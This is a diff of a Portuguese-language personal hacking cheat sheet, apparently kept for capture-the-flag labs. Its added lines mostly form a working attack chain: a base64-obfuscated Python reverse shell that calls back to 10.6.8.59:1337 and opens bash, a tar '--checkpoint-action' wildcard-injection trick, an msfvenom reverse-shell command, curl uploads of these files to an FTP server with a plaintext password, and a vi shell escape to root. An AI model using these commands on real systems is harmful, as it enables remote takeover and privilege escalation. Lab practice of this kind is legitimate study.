@@ -1,8 +1,8 @@
-my ip = 172.29.2.62
-ip machine = 10.10.30.220
+my ip = 10.6.8.59
+ip machine = 10.10.106.243
 
 
-
+10113 10415 21033 
 
 
 
@@ -39,7 +39,7 @@ grep -nr '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' #procurar ip e
 
 sha1sum #file  #transformar arquivos em hash(checando a integridade)
 
-find / -name "*shadow" -exec ls -lt {} \; 2>/dev/null #achar arquivos com "shadow" a partir da raiz geralmente contem as senhas(hash) de usuarios caso tenhamos permissão
+find / -name "user.txt" -exec ls -lt {} \; 2>/dev/null #achar arquivos com "shadow" a partir da raiz geralmente contem as senhas(hash) de usuarios caso tenhamos permissão
 
 :18234:0:99999:7::: #parte final com 3 pontos em um hash não conta
 
@@ -124,6 +124,33 @@ stegcracker <file> [<wordlist>] #quebrar senha para steghide
 gcc -o <output-file> <source-file> #compilar um arquivo C
 
 scp file.txt remote_username@10.10.0.2:/remote/directory #copiar arquivos no linux
+
+zip, tar, gzip #formatos para pesquisar no fuzzing caso tenhamos pastas de backups
+
+curl -s -v -P - 'ftp://backupmgr:REMOVED@172.20.0.1/'  #usar em rede interna com algum arquivo de ftp por exemplo
+
+cd /tmp/                                                                                                                                                            echo "python3 -c \"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAgICwgICAgICBzdWJwcm9jZXNzICAgICAgICAgLCAgICAgIG9zICAgICA7ICAgICAgaG9zdD0iMTAuNi44LjU5IiAgICAgOyAgICAgIHBvcnQ9MTMzNyAgICAgOyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICAgICwgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICA7ICAgICAgcy5jb25uZWN0KChob3N0ICAgICAgICAgLCAgICAgIHBvcnQpKSAgICAgOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwgICAgICAwKSAgICAgOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwgICAgICAxKSAgICAgOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwgICAgICAyKSAgICAgOyAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))\"" > shell.sh                                                                                                                                                          echo "" > "--checkpoint-action=exec=sh shell.sh"                                                                                                                 echo "" > --checkpoint=1         #exemplo de como preparar uma shell criada pelo msfvenom  
+  
+msfvenom -p cmd/unix/reverse_python  lhost=10.6.8.59 lport=1337 R #comando de payload msfvenom
+
+curl -T "--checkpoint-action=exec=sh shell.sh" -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/' 
+curl -T "--checkpoint=1" -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
+curl -T shell.sh -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/' #upload dos anteriores no servidor da intranet
+
+curl -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/' -s #executar curl
+
+ln #utilitario para criar links simbólicos
+
+strace e ltrace #o strace monitoram as chamadas do sistema e o ltrace monitora as chamadas às funções das bibliotecas carregadas 
+
+sudo crontab -e #caso tenhamos acesso ao crontab como root
+
+:!/bin/bash   #finalizar o vi assim para poder pega root, (util tambem depois de utilizar sudo crontab -e)
+
+
+
+
+
 
 
 
